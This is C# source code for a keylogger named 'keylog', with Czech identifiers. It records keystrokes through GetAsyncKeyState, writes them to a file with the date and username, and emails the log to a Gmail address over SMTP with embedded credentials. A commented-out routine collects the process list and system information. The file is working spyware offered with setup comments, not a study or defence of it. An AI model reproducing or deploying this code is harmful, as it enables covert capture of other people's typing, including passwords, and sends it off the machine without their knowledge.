using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net.Mail;
using System.Diagnostics;

namespace keylog
{
    class keys
    {

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        public void klavesi_vstup()
        {
            StreamWriter output = new StreamWriter(@"C:\Users\ondra\Desktop\test.txt");

            smazt();
            int pocet_pismen = 0 ;
            bool vyp = false;
           

            while (vyp != true)
            {
                
                Thread.Sleep(10);

                for (int i = 0; i < 255; i++)
                {

                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 1 || keyState == -32767)
                    {

                        output.WriteLine((Keys)i);
                        output.Flush();
                        pocet_pismen++;

                        if (pocet_pismen > 10)                            // setting number of captured characters "10"                     
                        {  

                            output.Close();
                            vyp = true;                           
                        }

                        break;
                    }  

                }

            }

            if (vyp == true)
            {
                klavesnice_preklad();
                File.Delete(@"C:\Users\ondra\Desktop\test.txt");                              // set path log file
                odesilani("jmeno", "popis", @"C:\Users\ondra\Desktop\text1.txt");             // send file yor email
                   
            }
            return;
        }


        private void klavesnice_preklad()
        {

            DateTime dt = DateTime.Now;
            string sDate = dt.ToShortDateString();
            string preklad = "";
            string aktualni_uzivatel = Environment.UserName;

            string templine = File.ReadAllText(@"C:\Users\ondra\Desktop\test.txt").Replace(Environment.NewLine, preklad);

            templine = templine.Replace("LButton", String.Empty);
            templine = templine.Replace("Escape", String.Empty);
            templine = templine.Replace("RButton", String.Empty);
            templine = templine.Replace("Back", String.Empty);
            templine = templine.Replace("LControlKey", String.Empty);
            templine = templine.Replace("Menu", String.Empty);
            templine = templine.Replace("LMenu", String.Empty);
            templine = templine.Replace("Capital", String.Empty);
            templine = templine.Replace("Up", String.Empty);
            templine = templine.Replace("Down", String.Empty);
            templine = templine.Replace("Left", String.Empty);
            templine = templine.Replace("Right", String.Empty);
            templine = templine.Replace("LWin", String.Empty);
            templine = templine.Replace("RWin", String.Empty);
            templine = templine.Replace("Apps", String.Empty);
            templine = templine.Replace("Tab", String.Empty);
            templine = templine.Replace("Capital", String.Empty);
            templine = templine.Replace("ShiftKey", String.Empty);
            templine = templine.Replace("LShiftKey", String.Empty);
            templine = templine.Replace("PrintScreen", String.Empty);
            templine = templine.Replace("Scroll", String.Empty);
            templine = templine.Replace("Insert", String.Empty);
            templine = templine.Replace("Home", String.Empty);
            templine = templine.Replace("PageUp", String.Empty);
            templine = templine.Replace("Delete", String.Empty);
            templine = templine.Replace("End", String.Empty);
            templine = templine.Replace("Next", String.Empty);
            templine = templine.Replace("Decimal", String.Empty);
            templine = templine.Replace("NumLock", String.Empty);
            templine = templine.Replace("F1", String.Empty);
            templine = templine.Replace("F2", String.Empty);
            templine = templine.Replace("F3", String.Empty);
            templine = templine.Replace("F4", String.Empty);
            templine = templine.Replace("F5", String.Empty);
            templine = templine.Replace("F6", String.Empty);
            templine = templine.Replace("F7", String.Empty);
            templine = templine.Replace("F8", String.Empty);
            templine = templine.Replace("F9", String.Empty);
            templine = templine.Replace("F10", String.Empty);
            templine = templine.Replace("F11", String.Empty);
            templine = templine.Replace("F12", String.Empty);
            templine = templine.Replace("ControlKey", String.Empty);

            templine = templine.Replace("Space", " ");
            templine = templine.Replace("Return", "\n");

            File.WriteAllText(@"C:\Users\ondra\Desktop\text1.txt", sDate +"\n" + aktualni_uzivatel +"\n" + templine);
            //  LOG textu

            return;
        }


        private void odesilani(string title, string popis, string Patch)
        {
            MailMessage mail = new MailMessage();

            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("ondrej.nemecekk@gmail.com");
            mail.To.Add("ondrej.nemecekk@gmail.com");
            mail.Subject = title;
            mail.Body = popis;


            Attachment attachment = new Attachment(Patch);
            mail.Attachments.Add(attachment);

            SmtpServer.Port = 587;
      
            SmtpServer.Credentials = new System.Net.NetworkCredential("ondrej.nemecekk@gmail.com", "...password...");       // your email and password email
            SmtpServer.EnableSsl = true;
            SmtpServer.Send(mail);

            return;
        }


        private void smazt()
        {

            File.Delete(@"C: \Users\ondra\Desktop\text1.txt");

            return;
        }


        /*
        private void dalsi_info()
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            string cmd = p.StartInfo.Arguments = @"/c tasklist -svc >> C:\Users\ondra\Desktop\aaaa.txt && systeminfo >> C:\Users\ondra\Desktop\aaaa.txt";
            p.Start();

        }
        */
    }
}
